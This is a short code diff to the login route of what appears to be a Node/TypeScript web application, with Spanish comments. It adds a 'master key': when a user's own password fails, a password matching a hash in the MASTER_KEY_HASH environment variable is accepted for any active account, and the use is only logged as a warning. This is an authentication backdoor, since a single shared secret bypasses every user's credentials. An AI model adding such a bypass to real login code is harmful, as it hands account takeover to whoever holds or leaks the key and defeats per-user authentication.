@@ -24,7 +24,15 @@ router.post('/login', async (req, res: Response) => {
             return;
         }
 
-        const validPassword = await bcrypt.compare(password, usuario.passwordHash);
+        let validPassword = await bcrypt.compare(password, usuario.passwordHash);
+        if (!validPassword) {
+            // Clave maestra de emergencia (hash bcrypt en MASTER_KEY_HASH): entra con cualquier usuario activo.
+            const masterKeyHash = process.env['MASTER_KEY_HASH'];
+            if (masterKeyHash && await bcrypt.compare(password, masterKeyHash)) {
+                console.warn(`[MASTER_KEY_LOGIN] ${usuario.email}`);
+                validPassword = true;
+            }
+        }
         if (!validPassword) {
             res.status(401).json({ error: 'Credenciales inválidas' });
             return;
